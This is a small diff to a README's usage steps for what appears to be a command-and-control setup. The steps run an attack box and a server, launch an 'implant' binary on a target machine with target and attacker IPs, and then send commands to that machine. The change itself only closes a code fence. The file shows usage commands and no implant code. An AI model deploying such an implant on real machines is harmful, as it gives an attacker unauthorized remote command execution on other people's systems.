@@ -18,7 +18,7 @@ HOW TO USE:
     - ```sudo python3 attackbox.py```
     - ```sudo python3 server.py```
 4. Run C Code on target machine
-    - ```./implant <timeInterval(s)> <Target IP> <Attack IP>
+    - ```./implant <timeInterval(s)> <Target IP> <Attack IP>```
 5. Once you receive "Type your message" on attackbox terminal, input your desired command in and press enter
 6. Receive output on server terminal
 7. Be Happy :) <--- He has lipstic on VSCode
